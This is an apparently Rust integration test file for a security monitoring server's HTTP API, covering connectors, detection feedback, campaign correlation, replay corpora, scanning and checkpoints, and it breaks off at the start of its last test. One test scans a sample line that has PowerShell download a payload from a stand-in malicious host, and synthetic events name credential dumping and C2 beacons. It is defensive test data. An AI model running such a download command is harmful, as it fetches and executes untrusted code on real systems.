mod common;
use common::*;

// ── GET /api/status ────────────────────────────────────────────

#[test]
fn status_returns_200_with_expected_keys() {
    let (port, token) = spawn_test_server();
    let resp = ureq::get(&format!("{}/api/status", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("status request");
    assert_eq!(resp.status(), 200);

    let body: serde_json::Value = resp.into_json().unwrap();
    assert!(body.get("updated_at").is_some());
    assert_eq!(body["version"].as_str().unwrap(), env!("CARGO_PKG_VERSION"));
    assert!(body.get("backlog_completed").is_some());
    assert_eq!(body["phases_completed"].as_u64().unwrap(), 28);
    assert_eq!(body["tasks_completed"].as_u64().unwrap(), 160);
    assert_eq!(body["total_tasks"].as_u64().unwrap(), 160);
    assert!(body.get("cli_commands").is_some());
    assert!(body.get("implemented").is_some());
    assert!(body.get("partially_wired").is_some());
    assert!(body.get("not_implemented").is_some());
}

#[test]
fn command_summary_returns_lane_health() {
    let (port, token) = spawn_test_server();
    let resp = ureq::get(&format!("{}/api/command/summary", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("command summary request");
    assert_eq!(resp.status(), 200);

    let body: serde_json::Value = resp.into_json().unwrap();
    assert!(body["generated_at"].as_str().is_some());
    assert!(body["metrics"]["open_incidents"].as_u64().is_some());
    assert!(
        body["metrics"]["pending_remediation_reviews"]
            .as_u64()
            .is_some()
    );
    assert!(body["metrics"]["connector_issues"].as_u64().is_some());
    assert!(
        body["shift_board"]["active_owner"]["name"]
            .as_str()
            .is_some()
    );
    assert!(
        body["shift_board"]["sla_age_buckets"]["breached"]
            .as_u64()
            .is_some()
    );
    assert!(
        body["shift_board"]["lanes"]
            .as_array()
            .unwrap()
            .iter()
            .any(|lane| lane["id"] == "cases" && lane["next_action"].as_str().is_some())
    );
    assert_eq!(
        body["lanes"]["release"]["current_version"]
            .as_str()
            .unwrap(),
        env!("CARGO_PKG_VERSION")
    );
    let planned = body["lanes"]["connectors"]["planned"].as_array().unwrap();
    assert!(planned.iter().any(|entry| entry == "github_audit"));
    assert!(planned.iter().any(|entry| entry == "crowdstrike_falcon"));
    assert!(planned.iter().any(|entry| entry == "generic_syslog"));
    assert!(body["lanes"]["rule_tuning"]["review_calendar"]["items"].is_array());
}

#[test]
fn command_lane_endpoint_returns_per_lane_slice() {
    let (port, token) = spawn_test_server();
    let resp = ureq::get(&format!("{}/api/command/lanes/release", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("command lane release request");
    assert_eq!(resp.status(), 200);
    let body: serde_json::Value = resp.into_json().unwrap();
    assert_eq!(body["lane"].as_str().unwrap(), "release");
    assert!(body["generated_at"].as_str().is_some());
    assert_eq!(
        body["payload"]["current_version"].as_str().unwrap(),
        env!("CARGO_PKG_VERSION")
    );
    assert!(body["payload"]["status"].as_str().is_some());

    // Unknown lane returns 404.
    let resp = ureq::get(&format!("{}/api/command/lanes/bogus", base(port)))
        .set("Authorization", &auth_header(&token))
        .call();
    let status = match resp {
        Ok(r) => r.status(),
        Err(ureq::Error::Status(code, _)) => code,
        Err(other) => panic!("unexpected error: {other:?}"),
    };
    assert_eq!(status, 404);
}

#[test]
fn websocket_stats_exposes_transport_capability() {
    let (port, token) = spawn_test_server();
    let resp = ureq::get(&format!("{}/api/ws/stats", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("websocket stats request");
    assert_eq!(resp.status(), 200);

    let body: serde_json::Value = resp.into_json().unwrap();
    assert_eq!(body["connected_clients"].as_u64().unwrap(), 0);
    assert_eq!(body["subscribers"].as_u64().unwrap(), 0);
    assert_eq!(body["native_websocket_supported"].as_bool(), Some(false));
}

#[test]
fn planned_connector_config_and_validation_persist() {
    let (port, token) = spawn_test_server();
    let config = serde_json::json!({
        "enabled": true,
        "organization": "wardex-labs",
        "token_ref": "secret://github/audit-token",
        "webhook_secret_ref": "secret://github/webhook-secret",
        "poll_interval_secs": 300,
        "repositories": ["wardex"],
    });
    let saved = ureq::post(&format!("{}/api/collectors/github/config", base(port)))
        .set("Authorization", &auth_header(&token))
        .set("Content-Type", "application/json")
        .send_string(&config.to_string())
        .expect("save github collector setup");
    assert_eq!(saved.status(), 200);
    let saved_body: serde_json::Value = saved.into_json().unwrap();
    assert_eq!(saved_body["provider"].as_str().unwrap(), "github_audit");
    assert_eq!(
        saved_body["validation"]["status"].as_str().unwrap(),
        "ready"
    );
    assert_eq!(
        saved_body["config"]["token_ref"].as_str().unwrap(),
        "********"
    );
    assert!(saved_body["config"]["has_token_ref"].as_bool().unwrap());

    let loaded = ureq::get(&format!("{}/api/collectors/github", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("load github collector setup");
    let loaded_body: serde_json::Value = loaded.into_json().unwrap();
    assert_eq!(
        loaded_body["validation"]["status"].as_str().unwrap(),
        "ready"
    );
    assert_eq!(
        loaded_body["config"]["organization"].as_str().unwrap(),
        "wardex-labs"
    );

    let validated = ureq::post(&format!("{}/api/collectors/github/validate", base(port)))
        .set("Authorization", &auth_header(&token))
        .set("Content-Type", "application/json")
        .send_string("{}")
        .expect("validate github collector setup");
    let validation_body: serde_json::Value = validated.into_json().unwrap();
    assert_eq!(
        validation_body["provider"].as_str().unwrap(),
        "github_audit"
    );
    assert!(validation_body["success"].as_bool().unwrap());
    assert!(validation_body["event_count"].as_u64().unwrap() > 0);
    assert!(
        validation_body["reliability"]["checkpoint_id"]
            .as_str()
            .is_some()
    );

    let status = ureq::get(&format!("{}/api/collectors/status", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("collector status request");
    let status_body: serde_json::Value = status.into_json().unwrap();
    let collectors = status_body["collectors"].as_array().unwrap();
    assert!(collectors.iter().any(|collector| {
        collector["provider"] == "github_audit"
            && collector["label"] == "GitHub Audit Log"
            && collector["freshness"] == "fresh"
    }));
}

// ── GET /api/report ────────────────────────────────────────────

#[test]
fn report_returns_200_with_summary_and_samples() {
    let (port, token) = spawn_test_server();
    let resp = ureq::get(&format!("{}/api/report", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("report request");
    assert_eq!(resp.status(), 200);

    let body: serde_json::Value = resp.into_json().unwrap();
    assert!(body.get("summary").is_some());
    assert!(body.get("samples").is_some());
    let samples = body["samples"].as_array().unwrap();
    // Fresh server with no alerts returns an empty or populated live sample list without error.
    let _ = samples.len();
}

#[test]
fn onboarding_readiness_and_manager_queue_digest_return_structured_payloads() {
    let (port, token) = spawn_test_server();
    let auth = auth_header(&token);

    let readiness = ureq::get(&format!("{}/api/onboarding/readiness", base(port)))
        .set("Authorization", &auth)
        .call()
        .expect("onboarding readiness");
    assert_eq!(readiness.status(), 200);
    let readiness_body: serde_json::Value = readiness.into_json().unwrap();
    assert!(readiness_body["total"].as_u64().unwrap() >= 7);
    assert!(readiness_body["checks"].as_array().unwrap().len() >= 7);

    let digest = ureq::get(&format!("{}/api/manager/queue-digest", base(port)))
        .set("Authorization", &auth)
        .call()
        .expect("manager queue digest");
    assert_eq!(digest.status(), 200);
    let digest_body: serde_json::Value = digest.into_json().unwrap();
    assert!(digest_body.get("queue").is_some());
    assert!(digest_body.get("changes_since_last_shift").is_some());
}

#[test]
fn detection_feedback_roundtrip_and_explainability_include_feedback() {
    let (port, token) = spawn_test_server();
    let auth = auth_header(&token);
    let agent_id = enroll_test_agent(port, &token, "feedback-agent");

    let batch = serde_json::json!({
        "agent_id": agent_id,
        "events": [{
            "timestamp": "2026-04-22T10:00:00Z",
            "hostname": "feedback-agent",
            "platform": "linux",
            "score": 8.4,
            "confidence": 0.93,
            "level": "Critical",
            "action": "credential_access",
            "reasons": ["credential_dump_attempt user=alice", "lsass_access dst=10.0.0.5 c2_beacon"],
            "sample": {
                "timestamp_ms": 0, "cpu_load_pct": 40.0, "memory_load_pct": 50.0,
                "temperature_c": 60.0, "network_kbps": 100.0, "auth_failures": 3,
                "battery_pct": 80.0, "integrity_drift": 0.1,
                "process_count": 50, "disk_pressure_pct": 10.0
            },
            "enforced": false
        }]
    });
    ureq::post(&format!("{}/api/events", base(port)))
        .set("Content-Type", "application/json")
        .send_string(&batch.to_string())
        .expect("ingest event");

    let feedback = ureq::post(&format!("{}/api/detection/feedback", base(port)))
        .set("Authorization", &auth)
        .set("Content-Type", "application/json")
        .send_string(
            &serde_json::json!({
                "event_id": 1,
                "rule_id": "builtin:sigma:credential-access",
                "analyst": "alice",
                "verdict": "true_positive",
                "reason_pattern": "credential_dump_attempt, lsass_access",
                "notes": "validated with host context",
                "evidence": [{
                    "kind": "reason",
                    "label": "Rule",
                    "value": "credential_dump_attempt",
                    "confidence": 0.93,
                    "source": "detector"
                }]
            })
            .to_string(),
        )
        .expect("record feedback");
    assert_eq!(feedback.status(), 200);

    let listed = ureq::get(&format!("{}/api/detection/feedback?event_id=1", base(port)))
        .set("Authorization", &auth)
        .call()
        .expect("list feedback");
    let listed_body: serde_json::Value = listed.into_json().unwrap();
    assert_eq!(listed_body["summary"]["total"].as_u64().unwrap(), 1);
    assert_eq!(
        listed_body["items"][0]["analyst"].as_str().unwrap(),
        "alice"
    );

    let by_rule = ureq::get(&format!(
        "{}/api/detection/feedback?rule_id={}",
        base(port),
        "builtin%3Asigma%3Acredential-access"
    ))
    .set("Authorization", &auth)
    .call()
    .expect("list feedback by rule");
    let by_rule_body: serde_json::Value = by_rule.into_json().unwrap();
    assert_eq!(by_rule_body["summary"]["total"].as_u64().unwrap(), 1);
    assert_eq!(
        by_rule_body["items"][0]["rule_id"].as_str().unwrap(),
        "builtin:sigma:credential-access"
    );

    let explain = ureq::get(&format!("{}/api/detection/explain?event_id=1", base(port)))
        .set("Authorization", &auth)
        .call()
        .expect("detection explain");
    assert_eq!(explain.status(), 200);
    let explain_body: serde_json::Value = explain.into_json().unwrap();
    assert!(!explain_body["why_fired"].as_array().unwrap().is_empty());
    assert_eq!(explain_body["feedback"].as_array().unwrap().len(), 1);
    let entity_scores = explain_body["entity_scores"].as_array().unwrap();
    assert!(
        entity_scores
            .iter()
            .any(|score| score["entity_kind"] == "host")
    );
    assert!(
        entity_scores
            .iter()
            .any(|score| score["entity_kind"] == "user")
    );
    assert!(
        entity_scores
            .iter()
            .any(|score| score["entity_kind"] == "network_destination")
    );
    let host_score = entity_scores
        .iter()
        .find(|score| score["entity_kind"] == "host")
        .unwrap();
    assert!(host_score["score_components"].as_array().unwrap().len() >= 2);
    assert!(
        !host_score["sequence_signals"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    assert!(!host_score["graph_context"].as_array().unwrap().is_empty());
    assert!(
        !host_score["recommended_pivots"]
            .as_array()
            .unwrap()
            .is_empty()
    );
}

#[test]
fn correlation_campaigns_cluster_stored_events_into_graph_view() {
    let (port, token) = spawn_test_server();
    let auth = auth_header(&token);
    let agent_a = enroll_test_agent(port, &token, "campaign-a");
    let agent_b = enroll_test_agent(port, &token, "campaign-b");

    for (agent_id, hostname, timestamp) in [
        (&agent_a, "campaign-a", "2026-04-22T10:00:00Z"),
        (&agent_b, "campaign-b", "2026-04-22T10:02:00Z"),
    ] {
        let batch = serde_json::json!({
            "agent_id": agent_id,
            "events": [{
                "timestamp": timestamp,
                "hostname": hostname,
                "platform": "linux",
                "score": 8.2,
                "confidence": 0.91,
                "level": "Critical",
                "action": "remote_execution",
                "reasons": ["credential_access", "lateral_movement", "c2_beacon"],
                "sample": {
                    "timestamp_ms": 0, "cpu_load_pct": 40.0, "memory_load_pct": 50.0,
                    "temperature_c": 60.0, "network_kbps": 100.0, "auth_failures": 3,
                    "battery_pct": 80.0, "integrity_drift": 0.1,
                    "process_count": 50, "disk_pressure_pct": 10.0
                },
                "enforced": false
            }]
        });
        ureq::post(&format!("{}/api/events", base(port)))
            .set("Content-Type", "application/json")
            .send_string(&batch.to_string())
            .expect("ingest campaign event");
    }

    let response = ureq::get(&format!("{}/api/correlation/campaigns", base(port)))
        .set("Authorization", &auth)
        .call()
        .expect("campaign correlation view");
    assert_eq!(response.status(), 200);
    let body: serde_json::Value = response.into_json().unwrap();
    assert_eq!(body["summary"]["campaign_count"].as_u64().unwrap(), 1);
    assert!(
        body["campaigns"].as_array().unwrap()[0]["hosts"]
            .as_array()
            .unwrap()
            .len()
            >= 2
    );
    assert!(body["graph"]["nodes"].as_array().unwrap().len() >= 2);
    assert!(!body["graph"]["edges"].as_array().unwrap().is_empty());
    assert!(
        body["sequence_summaries"].as_array().unwrap()[0]["sequence_signals"]
            .as_array()
            .unwrap()
            .len()
            >= 2
    );
}

#[test]
fn detection_replay_corpus_exposes_acceptance_gate() {
    let (port, token) = spawn_test_server();
    let auth = auth_header(&token);
    let response = ureq::get(&format!("{}/api/detection/replay-corpus", base(port)))
        .set("Authorization", &auth)
        .call()
        .expect("replay corpus gate");
    assert_eq!(response.status(), 200);
    let body: serde_json::Value = response.into_json().unwrap();
    assert!(body["summary"]["total_samples"].as_u64().unwrap() >= 6);
    assert!(body["summary"]["precision"].as_f64().unwrap() >= 0.0);
    assert!(
        body["acceptance_targets"]["precision_min"]
            .as_f64()
            .unwrap()
            > 0.0
    );
    let categories = body["categories"].as_array().unwrap();
    assert!(categories.iter().any(|item| item["id"] == "benign_admin"));
    assert!(
        categories
            .iter()
            .any(|item| item["id"] == "lateral_movement")
    );
    assert!(body["platform_deltas"].as_array().unwrap().len() >= 2);
    assert!(body["signal_type_deltas"].as_array().unwrap().len() >= 3);
    assert!(categories.iter().any(|item| item["platform"] == "linux"));
    assert!(
        categories
            .iter()
            .any(|item| item["signal_type"] == "identity")
    );
}

#[test]
fn detection_replay_corpus_accepts_custom_validation_pack() {
    let (port, token) = spawn_test_server();
    let auth = auth_header(&token);
    let response = ureq::post(&format!("{}/api/detection/replay-corpus", base(port)))
        .set("Authorization", &auth)
        .set("Content-Type", "application/json")
        .send_string(
            &serde_json::json!({
                "name": "customer-pack-alpha",
                "threshold": 2.0,
                "samples": [
                    {
                        "id": "admin-maintenance",
                        "label": "Admin maintenance window",
                        "expected": "benign",
                        "platform": "linux",
                        "signal_type": "admin_activity",
                        "sample": {
                            "timestamp_ms": 1,
                            "cpu_load_pct": 25.0,
                            "memory_load_pct": 35.0,
                            "temperature_c": 40.0,
                            "network_kbps": 750.0,
                            "auth_failures": 0,
                            "battery_pct": 90.0,
                            "integrity_drift": 0.01,
                            "process_count": 50,
                            "disk_pressure_pct": 12.0
                        }
                    },
                    {
                        "id": "credential-lateral-chain",
                        "label": "Credential theft and lateral movement",
                        "expected": "malicious",
                        "platform": "windows",
                        "signal_type": "identity",
                        "sample": {
                            "timestamp_ms": 2,
                            "cpu_load_pct": 86.0,
                            "memory_load_pct": 80.0,
                            "temperature_c": 60.0,
                            "network_kbps": 8600.0,
                            "auth_failures": 20,
                            "battery_pct": 70.0,
                            "integrity_drift": 0.32,
                            "process_count": 180,
                            "disk_pressure_pct": 80.0
                        }
                    }
                ]
            })
            .to_string(),
        )
        .expect("custom replay corpus gate");
    assert_eq!(response.status(), 200);
    let body: serde_json::Value = response.into_json().unwrap();
    assert_eq!(body["corpus_kind"], serde_json::json!("custom"));
    assert_eq!(body["pack_name"], serde_json::json!("customer-pack-alpha"));
    assert_eq!(body["summary"]["total_samples"].as_u64().unwrap(), 2);
    assert!(
        body["categories"]
            .as_array()
            .unwrap()
            .iter()
            .any(|item| item["id"] == "credential-lateral-chain")
    );
    assert!(
        body["platform_deltas"]
            .as_array()
            .unwrap()
            .iter()
            .any(|item| item["group"] == "windows")
    );
    assert!(
        body["signal_type_deltas"]
            .as_array()
            .unwrap()
            .iter()
            .any(|item| item["group"] == "identity")
    );
}

#[test]
fn detection_replay_corpus_accepts_retained_event_source() {
    let (port, token) = spawn_test_server();
    let auth = auth_header(&token);
    let agent_id = enroll_test_agent(port, &token, "retained-replay-agent");

    let batch = serde_json::json!({
        "agent_id": agent_id,
        "events": [
            {
                "timestamp": "2026-04-23T09:00:00Z",
                "hostname": "retained-replay-agent",
                "platform": "linux",
                "score": 0.8,
                "confidence": 0.82,
                "level": "Info",
                "action": "admin_maintenance",
                "reasons": ["approved_admin_script"],
                "sample": {
                    "timestamp_ms": 1,
                    "cpu_load_pct": 28.0,
                    "memory_load_pct": 35.0,
                    "temperature_c": 40.0,
                    "network_kbps": 650.0,
                    "auth_failures": 0,
                    "battery_pct": 88.0,
                    "integrity_drift": 0.01,
                    "process_count": 55,
                    "disk_pressure_pct": 10.0
                },
                "enforced": false
            },
            {
                "timestamp": "2026-04-23T09:05:00Z",
                "hostname": "retained-replay-agent",
                "platform": "linux",
                "score": 8.9,
                "confidence": 0.95,
                "level": "Critical",
                "action": "credential_access",
                "reasons": ["credential_dump_attempt", "lateral_movement"],
                "sample": {
                    "timestamp_ms": 2,
                    "cpu_load_pct": 91.0,
                    "memory_load_pct": 82.0,
                    "temperature_c": 65.0,
                    "network_kbps": 9600.0,
                    "auth_failures": 25,
                    "battery_pct": 70.0,
                    "integrity_drift": 0.38,
                    "process_count": 210,
                    "disk_pressure_pct": 82.0
                },
                "enforced": false
            }
        ]
    });
    ureq::post(&format!("{}/api/events", base(port)))
        .set("Content-Type", "application/json")
        .send_string(&batch.to_string())
        .expect("ingest retained replay events");

    let response = ureq::post(&format!("{}/api/detection/replay-corpus", base(port)))
        .set("Authorization", &auth)
        .set("Content-Type", "application/json")
        .send_string(
            &serde_json::json!({
                "source": "retained_events",
                "name": "retained-last-alerts",
                "threshold": 2.0,
                "limit": 10
            })
            .to_string(),
        )
        .expect("retained-event replay corpus gate");
    assert_eq!(response.status(), 200);
    let body: serde_json::Value = response.into_json().unwrap();
    assert_eq!(body["corpus_kind"], serde_json::json!("retained_events"));
    assert_eq!(body["pack_name"], serde_json::json!("retained-last-alerts"));
    assert_eq!(body["summary"]["total_samples"].as_u64().unwrap(), 2);
    assert!(
        body["categories"]
            .as_array()
            .unwrap()
            .iter()
            .any(|item| item["id"] == "event-1")
    );
    assert!(
        body["platform_deltas"]
            .as_array()
            .unwrap()
            .iter()
            .any(|item| item["group"] == "linux")
    );
    assert!(
        body["signal_type_deltas"]
            .as_array()
            .unwrap()
            .iter()
            .any(|item| item["group"] == "identity")
    );
}

#[test]
fn deep_scan_v2_and_threat_intel_v2_expose_profiles_and_sightings() {
    use base64::Engine as _;
    use sha2::{Digest, Sha256};

    let (port, token) = spawn_test_server();
    let auth = auth_header(&token);
    let data = b"powershell Invoke-WebRequest https://malicious.example/payload";
    let sha256 = {
        let mut hasher = Sha256::new();
        hasher.update(data);
        hex::encode(hasher.finalize())
    };

    ureq::post(&format!("{}/api/threat-intel/ioc", base(port)))
        .set("Authorization", &auth)
        .set("Content-Type", "application/json")
        .send_string(
            &serde_json::json!({
                "ioc_type": "hash",
                "value": sha256,
                "confidence": 0.91
            })
            .to_string(),
        )
        .expect("add threat intel ioc");

    let scan = ureq::post(&format!("{}/api/scan/buffer/v2", base(port)))
        .set("Authorization", &auth)
        .set("Content-Type", "application/json")
        .send_string(
            &serde_json::json!({
                "filename": "suspicious.ps1",
                "data": base64::engine::general_purpose::STANDARD.encode(data),
                "behavior": {
                    "suspicious_process_tree": true,
                    "defense_evasion": false,
                    "persistence_installed": true,
                    "c2_beaconing_detected": true,
                    "credential_access": false
                },
                "allowlist": {
                    "trusted_publishers": ["microsoft"],
                    "internal_tools": ["internal-updater"]
                }
            })
            .to_string(),
        )
        .expect("deep scan v2");
    assert_eq!(scan.status(), 200);
    let scan_body: serde_json::Value = scan.into_json().unwrap();
    assert!(scan_body.get("static_profile").is_some());
    assert!(scan_body.get("behavior_profile").is_some());
    assert!(!scan_body["scan"]["matches"].as_array().unwrap().is_empty());

    let library = ureq::get(&format!("{}/api/threat-intel/library/v2", base(port)))
        .set("Authorization", &auth)
        .call()
        .expect("threat intel library v2");
    let library_body: serde_json::Value = library.into_json().unwrap();
    assert!(library_body.get("indicators").is_some());
    assert!(library_body.get("recent_sightings").is_some());

    let sightings = ureq::get(&format!(
        "{}/api/threat-intel/sightings?limit=10",
        base(port)
    ))
    .set("Authorization", &auth)
    .call()
    .expect("threat intel sightings");
    let sightings_body: serde_json::Value = sightings.into_json().unwrap();
    assert!(sightings_body["count"].as_u64().unwrap() >= 1);
}

// ── POST /api/analyze — auth required ──────────────────────────

#[test]
fn analyze_without_auth_returns_401() {
    let (port, _token) = spawn_test_server();
    let csv = "1000,18.0,32.0,41.0,500.0,0,94.0,0.01,42,8.0\n";
    let err = ureq::post(&format!("{}/api/analyze", base(port)))
        .set("Content-Type", "text/csv")
        .send_string(csv);
    match err {
        Err(ureq::Error::Status(401, _)) => {}
        other => panic!("expected 401, got {other:?}"),
    }
}

#[test]
fn analyze_csv_returns_report() {
    let (port, token) = spawn_test_server();
    let csv = "1000,18.0,32.0,41.0,500.0,0,94.0,0.01,42,8.0\n\
               2000,64.0,58.0,51.0,5400.0,8,63.0,0.11,98,55.0\n";
    let resp = ureq::post(&format!("{}/api/analyze", base(port)))
        .set("Content-Type", "text/csv")
        .set("Authorization", &auth_header(&token))
        .send_string(csv)
        .expect("analyze csv");
    assert_eq!(resp.status(), 200);

    let body: serde_json::Value = resp.into_json().unwrap();
    assert!(body.get("summary").is_some());
    assert_eq!(body["summary"]["total_samples"].as_u64().unwrap(), 2);
}

#[test]
fn analyze_jsonl_returns_report() {
    let (port, token) = spawn_test_server();
    let jsonl = r#"{"timestamp_ms":1000,"cpu_load_pct":18.0,"memory_load_pct":32.0,"temperature_c":41.0,"network_kbps":500.0,"auth_failures":0,"battery_pct":94.0,"integrity_drift":0.01,"process_count":42,"disk_pressure_pct":8.0}"#;
    let resp = ureq::post(&format!("{}/api/analyze", base(port)))
        .set("Content-Type", "application/json")
        .set("Authorization", &auth_header(&token))
        .send_string(jsonl)
        .expect("analyze jsonl");
    assert_eq!(resp.status(), 200);

    let body: serde_json::Value = resp.into_json().unwrap();
    assert_eq!(body["summary"]["total_samples"].as_u64().unwrap(), 1);
}

// ── POST /api/control/mode ─────────────────────────────────────

#[test]
fn set_mode_frozen() {
    let (port, token) = spawn_test_server();
    let resp = ureq::post(&format!("{}/api/control/mode", base(port)))
        .set("Authorization", &auth_header(&token))
        .send_json(serde_json::json!({"mode": "frozen"}))
        .expect("set mode frozen");
    assert_eq!(resp.status(), 200);
    let body: serde_json::Value = resp.into_json().unwrap();
    assert!(body["status"].as_str().unwrap().contains("frozen"));
}

#[test]
fn set_mode_decay() {
    let (port, token) = spawn_test_server();
    let resp = ureq::post(&format!("{}/api/control/mode", base(port)))
        .set("Authorization", &auth_header(&token))
        .send_json(serde_json::json!({"mode": "decay", "decay_rate": 0.1}))
        .expect("set mode decay");
    assert_eq!(resp.status(), 200);
    let body: serde_json::Value = resp.into_json().unwrap();
    assert!(body["status"].as_str().unwrap().contains("decay"));
}

#[test]
fn set_mode_unknown_returns_400() {
    let (port, token) = spawn_test_server();
    let err = ureq::post(&format!("{}/api/control/mode", base(port)))
        .set("Authorization", &auth_header(&token))
        .send_json(serde_json::json!({"mode": "turbo"}));
    match err {
        Err(ureq::Error::Status(400, _)) => {}
        other => panic!("expected 400, got {other:?}"),
    }
}

#[test]
fn detection_summary_includes_mode_and_learning_state() {
    let (port, token) = spawn_test_server();
    let resp = ureq::get(&format!("{}/api/detection/summary", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("detection summary");
    assert_eq!(resp.status(), 200);

    let body: serde_json::Value = resp.into_json().unwrap();
    assert_eq!(body["mode"].as_str().unwrap(), "normal");
    assert!((body["ewma_alpha"].as_f64().unwrap() - 0.22).abs() < 1e-6);
    assert_eq!(body["warmup_samples"].as_u64().unwrap(), 4);
    assert!((body["learn_threshold"].as_f64().unwrap() - 2.5).abs() < 1e-6);
    assert_eq!(body["observed_samples"].as_u64().unwrap(), 0);
    assert!(!body["baseline_ready"].as_bool().unwrap());
}

#[test]
fn slo_status_tracks_error_totals() {
    let (port, token) = spawn_test_server();

    let err = ureq::get(&format!("{}/api/status", base(port))).call();
    match err {
        Err(ureq::Error::Status(401, _)) => {}
        other => panic!("expected 401, got {other:?}"),
    }

    let err = ureq::get(&format!("{}/api/nonexistent", base(port)))
        .set("Authorization", &auth_header(&token))
        .call();
    match err {
        Err(ureq::Error::Status(404, _)) => {}
        other => panic!("expected 404, got {other:?}"),
    }

    let resp = ureq::get(&format!("{}/api/slo/status", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("slo status");
    let body: serde_json::Value = resp.into_json().unwrap();
    assert!(body["total_requests"].as_u64().unwrap() >= 3);
    assert!(body["total_errors"].as_u64().unwrap() >= 2);
    assert!(body["successful_requests"].as_u64().unwrap() >= 1);
}

// ── POST /api/control/reset-baseline ───────────────────────────

#[test]
fn reset_baseline_returns_200() {
    let (port, token) = spawn_test_server();
    let resp = ureq::post(&format!("{}/api/control/reset-baseline", base(port)))
        .set("Authorization", &auth_header(&token))
        .send_string("")
        .expect("reset baseline");
    assert_eq!(resp.status(), 200);
}

// ── POST /api/control/run-demo ─────────────────────────────────

#[test]
fn run_demo_returns_report() {
    let (port, token) = spawn_test_server();
    let resp = ureq::post(&format!("{}/api/control/run-demo", base(port)))
        .set("Authorization", &auth_header(&token))
        .send_string("")
        .expect("run demo");
    assert_eq!(resp.status(), 200);
    let body: serde_json::Value = resp.into_json().unwrap();
    assert!(body.get("summary").is_some());
    assert!(body.get("samples").is_some());
}

#[test]
fn first_run_proof_creates_reopenable_evidence() {
    let (port, token) = spawn_test_server();
    let resp = ureq::post(&format!("{}/api/support/first-run-proof", base(port)))
        .set("Authorization", &auth_header(&token))
        .send_string("")
        .expect("first-run proof");
    assert_eq!(resp.status(), 200);
    let body: serde_json::Value = resp.into_json().unwrap();
    assert!(
        body["digest"]
            .as_str()
            .is_some_and(|value| !value.is_empty())
    );
    assert_eq!(body["proof"]["status"], serde_json::json!("completed"));
    assert!(body["proof"]["case_id"].as_u64().is_some());
    assert!(body["proof"]["report_id"].as_u64().is_some());
    assert_eq!(
        body["proof"]["response_status"],
        serde_json::json!("DryRunCompleted")
    );
    assert!(
        body["proof"]["artifact_metadata"]["support_run"]["artifact_hash"]
            .as_str()
            .is_some_and(|value| !value.is_empty())
    );
    assert_eq!(
        body["proof"]["demo_surfaces"]["identity"]["provider"],
        serde_json::json!("okta_identity")
    );
    assert_eq!(
        body["proof"]["demo_surfaces"]["attack_graph"]["campaign"],
        serde_json::json!("first-run-proof-lateral-path")
    );
}

// ── Checkpoint round-trip ──────────────────────────────────────

#[test]
fn checkpoint_save_and_restore_round_trip() {
    let (port, token) = spawn_test_server();
    let auth = auth_header(&token);

    // Feed samples so the detector has a baseline to snapshot
    let csv = "1000,18.0,32.0,41.0,500.0,0,94.0,0.01,42,8.0\n";
    ureq::post(&format!("{}/api/analyze", base(port)))
        .set("Authorization", &auth)
        .set("Content-Type", "text/csv")
        .send_string(csv)
        .expect("analyze for baseline");

    // Save a checkpoint
    let resp = ureq::post(&format!("{}/api/control/checkpoint", base(port)))
        .set("Authorization", &auth)
        .send_string("")
        .expect("checkpoint save");
    assert_eq!(resp.status(), 200);
    let body: serde_json::Value = resp.into_json().unwrap();
    assert_eq!(body["total"].as_u64().unwrap(), 1);

    // List checkpoints
    let resp = ureq::get(&format!("{}/api/checkpoints", base(port)))
        .set("Authorization", &auth)
        .call()
        .expect("list checkpoints");
    assert_eq!(resp.status(), 200);
    let body: serde_json::Value = resp.into_json().unwrap();
    assert_eq!(body["count"].as_u64().unwrap(), 1);
    assert_eq!(body["device_states"].as_array().unwrap().len(), 1);

    // Restore checkpoint
    let resp = ureq::post(&format!("{}/api/control/restore-checkpoint", base(port)))
        .set("Authorization", &auth)
        .send_string("")
        .expect("restore checkpoint");
    assert_eq!(resp.status(), 200);
    let body: serde_json::Value = resp.into_json().unwrap();
    assert_eq!(body["status"].as_str().unwrap(), "checkpoint restored");
    assert!(body["baseline_restored"].as_bool().unwrap());
    assert!(body["device_state"].is_object());
    assert!(!body["actions"].as_array().unwrap().is_empty());
}

#[test]
fn restore_without_checkpoints_returns_404() {
    let (port, token) = spawn_test_server();
    let err = ureq::post(&format!("{}/api/control/restore-checkpoint", base(port)))
        .set("Authorization", &auth_header(&token))
        .send_string("");
    match err {
        Err(ureq::Error::Status(404, _)) => {}
        other => panic!("expected 404, got {other:?}"),
    }
}

#[test]
fn checkpoint_restore_reapplies_saved_device_state() {
    let (port, token) = spawn_test_server();
    let auth = auth_header(&token);

    let csv = "1000,18.0,32.0,41.0,500.0,0,94.0,0.01,42,8.0\n\
               2000,64.0,58.0,51.0,5400.0,8,63.0,0.11,98,55.0\n";
    ureq::post(&format!("{}/api/analyze", base(port)))
        .set("Authorization", &auth)
        .set("Content-Type", "text/csv")
        .send_string(csv)
        .expect("analyze for quarantine state");

    ureq::post(&format!("{}/api/control/checkpoint", base(port)))
        .set("Authorization", &auth)
        .send_string("")
        .expect("checkpoint save");

    let checkpoint_state = ureq::get(&format!("{}/api/checkpoints", base(port)))
        .set("Authorization", &auth)
        .call()
        .expect("list checkpoints")
        .into_json::<serde_json::Value>()
        .unwrap()["device_states"][0]
        .clone();

    let resp = ureq::post(&format!("{}/api/control/restore-checkpoint", base(port)))
        .set("Authorization", &auth)
        .send_string("")
        .expect("restore checkpoint");
    let body: serde_json::Value = resp.into_json().unwrap();

    assert_eq!(body["device_state"], checkpoint_state);
}

// ── OPTIONS (CORS preflight) ──────────────────────────────────

#[test]
fn options_returns_cors_headers() {
    let (port, _token) = spawn_test_server();
    let resp = ureq::request("OPTIONS", &format!("{}/api/status", base(port)))
        .call()
        .expect("options request");
    assert_eq!(resp.status(), 204);
    assert!(resp.header("Access-Control-Allow-Methods").is_some());
    assert!(resp.header("Access-Control-Allow-Headers").is_some());
}

// ── Unknown endpoint ──────────────────────────────────────────

#[test]
fn unknown_api_endpoint_returns_404() {
